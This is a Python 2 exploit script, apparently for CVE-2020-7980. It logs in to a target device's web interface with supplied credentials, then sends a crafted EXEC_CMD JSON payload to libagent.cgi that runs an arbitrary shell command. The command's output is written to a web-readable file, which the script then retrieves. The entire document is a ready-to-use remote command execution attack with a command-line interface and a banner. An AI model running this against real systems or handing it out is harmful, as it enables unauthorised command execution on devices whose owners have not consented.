import random
import sys
import time
import getopt
import requests

from pwn import *
from termcolor import colored, cprint
from img2banner.img2banner import covertImageToAscii


def banner():
    # conver img to banner
    aimg = covertImageToAscii("logo.png", 80, 0.43, True, debug=False) 
    print colored("\n".join(aimg), 'red', attrs=["dark"])
    print ""
    print colored("\t\tSpecial thanks for the author(s) of this CVE (CVE-2020-7980): @Capitan_Alfa", "blue")


def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:c:r:vq", ["help", "output="])
    except getopt.GetoptError as err:
        # print help information and exit:
        print(err) # will print something like "option -a not recognized"
        usage()
        sys.exit(2)
    output = None
    verbose = False
    target = None
    run = None
    quiet = False
    username, password = None, None
    for o, a in opts:
        if o == "-v":
            verbose = True
        elif o in ("-q", "--quiet"):
            quiet = True
        elif o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-r", "--run"):
            run = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-c", "--creds"):
            if ":" not in a:
                log.error("Wrong formatted credentials. ':' not present!")
                sys.exit(2)
            username, password = a.split(":",1)
        else:
            assert False, "unhandled option"
    if not target:
        log.warn("Target missing! Use '-t'")
        sys.exit(2)
    if not username or not password:
        log.warn("Credentials missing! Use '-c'")
        sys.exit(2)
    if not quiet:
        banner()

    sid = str(int(100000000+(random.random()*1000000000)))
    cookies = {"sid": sid}
    data = {
            "username": username,
            "pw": password,
            "rdo_control_flag": 1,
            "SID": sid
    }
    time.sleep(1)
    if not quiet:
        p = log.progress('Working')
        p.status("Logging in with '{}:{}'".format(username, password))
    r = requests.post(target + "/cgi-bin/setagent.cgi?type=l", data=data, cookies=cookies)
    if r.status_code != 200:
        log.warn("Login failed!")
        sys.exit(2)
    time.sleep(1)
    if not quiet:
        p = log.progress('Working')
        p.status("Running Command '{}'".format(run))
    payload = '{"O_":"A","V_":1,"S_":%s,"F_":"EXEC_CMD","P1_":{"F":"EXEC_CMD","Q":"%s > /usr/local/www/files/.output"}}' % (sid, run)
    r = requests.post(target + "/cgi-bin/libagent.cgi?type=J", data=payload, cookies=cookies)
    if not quiet:
        p = log.progress('Working')
        p.status("Getting output ...".format(run))
    r = requests.post(target + "/files/.output", data=payload, cookies=cookies)
    output = r.text
    print output



if __name__ == "__main__":
    main()
